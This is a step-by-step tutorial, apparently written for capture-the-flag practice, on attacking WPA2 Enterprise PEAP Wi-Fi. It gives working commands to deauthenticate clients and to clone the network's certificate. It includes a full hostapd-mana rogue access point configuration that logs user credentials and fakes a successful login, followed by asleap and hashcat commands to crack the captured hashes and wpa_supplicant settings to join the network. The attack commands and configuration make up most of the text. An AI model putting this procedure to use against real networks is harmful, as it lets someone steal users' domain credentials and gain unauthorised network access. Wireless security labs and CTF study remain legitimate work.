## Defeating WPA2 Enterprise PEAP Authentication Demonstration[](#defeating-wpa2-enterprise-peap-authentication-demonstration)

In this section, we’ll cover how to exploit WPA2 Enterprise PEAP authentication, a common challenge in Capture the Flag (CTF) competitions involving wireless network security. This demonstration will guide you through network reconnaissance, capturing handshakes, and launching a Man-in-the-Middle (MitM) attack to extract credentials.

You can watch the full demonstration on [YouTube](https://www.youtube.com/watch?v=tLuUezovvEs) and [Article](https://systemweakness.com/defeating-wpa2-enterprise-peap-authentication-418829b8922c)

---
### Step-by-Step Process

#### 1. Kill Unwanted Services and Put Your Interface into Monitor Mode

To start, stop any conflicting services and put your wireless interface into monitor mode.

```bash
airmon-ng check kill && airmon-ng start wlan0
```

Replace wlan0 with your interface if necessary

#### 2. Network Reconnaissance

Use `airodump-ng` to scan for wireless networks and detect WPA2 Enterprise setups.

```bash
airodump-ng wlan0mon
```

This command lists available wireless networks. Find the target network's BSSID, ESSID, and channel for the next steps.

- Replace `<channel>` with the target network’s channel.
- Replace `<capturefile>` with a filename to store the captured data.

#### 3. Capture Handshake

Once you’ve identified the target network, start capturing packets on the specific channel:

```bash
airodump-ng -c <channel> -w <capturefile> wlan0mon
```

#### 4. Deauthenticate a Client to Capture the Handshake

To capture the handshake, deauthenticate a client connected to the target network:

```bash
aireplay-ng -0 1 -a 02:13:37:BE:EF:03 -c DE:E2:56:7C:E2:1F wlan0mon
```

Replace the -a and -c options with the BSSID and client MAC address you are targeting.

Once the handshake is captured, stop the monitor mode on the wireless device

```bash
airmon-ng stop wlan0mon
```

#### 5. Obtain the Certificate Files

Remote into your system and open Wireshark to capture the certificate files during the PEAP handshake. Use the following filter to capture the necessary packets:

```bash
wlan.bssid==02:13:37:BE:EF:03&& eap && tls.handshake.certificate
```

Drill down into the packet details. Go to TLSv1 Record Layer → Handshake Protocol → Certificate.

Right-click the certificate string and select "Export Packet Bytes" to save the certificate file.

#### 6. Configure and Start FreeRADIUS Server

Next, convert the certificate to the proper format and configure FreeRADIUS to use it. Start by converting the certificate:

```bash
openssl x509 -inform der -in cert.der -text
```

Then, configure FreeRADIUS with the correct certificate information:

```text
Country (C)
State (ST)
Locality (L)
Organization (O)
Email
Common Name must match the certificate information.
```

Modify the ca.cnf and server.cnf files in /etc/freeradius/3.0/certs/ with the certificate details (shown as screenshots in the source).

Change directories to /etc/freeradius/3.0/certs/ and run:

```bash
rm dh && make
```

#### 7. **Prepare Hostapd for EAP Authentication**[](#id-7.-prepare-hostapd-for-eap-authentication)

Create the `mana.conf` file in `/etc/hostapd-mana/` with the following configuration:
```bash
# SSID of the AP

ssid=SSID

# Network interface to use and driver type

# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'

interface=wlan0

driver=nl80211

# Channel and mode

# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)

channel=CHANNEL

# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax

hw_mode=g

# Setting up hostapd as an EAP server

ieee8021x=1

eap_server=1

# Key workaround for Win XP

eapol_key_index_workaround=0

# EAP user file we created earlier

eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier

ca_cert=/etc/freeradius/3.0/certs/ca.pem

server_cert=/etc/freeradius/3.0/certs/server.pem

private_key=/etc/freeradius/3.0/certs/server.key

# The password is actually 'whatever'

private_key_passwd=whatever

dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication

auth_algs=1

# WPA/WPA2

wpa=3

# WPA Enterprise

wpa_key_mgmt=WPA-EAP

# Allow CCMP and TKIP

# Note: iOS warns when network has TKIP (or WEP)

wpa_pairwise=CCMP TKIP

# Enable Mana WPE

mana_wpe=1

# Store credentials in that file

mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected

mana_eapsuccess=1

# EAP TLS MitM

mana_eaptls=1
```

Next, create the `mana.eap_user` file in `/etc/hostapd-mana/` with the following configurations:
```bash
* PEAP,TTLS,TLS,FAST

"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
```

#### 8. **Start the Hostapd-MANA Server**[](#id-8.-start-the-hostapd-mana-server)

Run the following command to start the Hostapd-MANA server:

```bash
hostapd-mana /etc/hostapd-mana/mana.conf
```

This will emulate a rogue AP using the WPA2 Enterprise configuration.

#### 9. **Capture User Login Credentials**[](#id-9.-capture-user-login-credentials)

Monitor traffic using `hostapd-mana` for successful logins. Once a user successfully authenticates, you can capture their credentials. Use `asleap` to crack the credentials:

```bash
./asleap -C 'd6:ff:33:73:aa:35:3f:3b' -R '4e:45:c7:ba:b0:93:d7:01:1e:9b:3a:5d:f7:d9:fa:88:21:2b:ea:c5:ac:9c:8c:47' -W /usr/share/wordlists/rockyou.txt
```

#### 10. **Use Hashcat to Crack the Hashes**[](#id-10.-use-hashcat-to-crack-the-hashes)

You can also use `hashcat` to crack the obtained hashes:

```bash
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

11. **Connecting to The Wireless Network:**

Finally, create a `wpa.conf` file for WPA2 EAP authentication. You are adding in the SSID, username, and password:

```bash
network={
	ssid="NetworkName"
	scan_ssid=1
	key_mgmt=WPA-EAP
	identity="Domain\username"
	password="password"
	eap=PEAP
	phase1=peaplabel=0"
	phase2="auth=MSCHAPV2"
}
```

To connect to the network:

```bash
wpa_supplicant -c wpa.conf -i wlan0mon
```

Then, obtain an IP address:

```bash
sudo dhclient wlan0 -v
```

### Summary[](#summary)

By following these steps, you’ve learned how to crack WPA2 Enterprise PEAP authentication using tools like `hostapd-mana`, `Wireshark`, and `asleap`. This process involves capturing handshakes, emulating a rogue AP, and cracking the credentials to gain network access. This method is often used in CTF challenges focused on wireless security and authentication exploits.
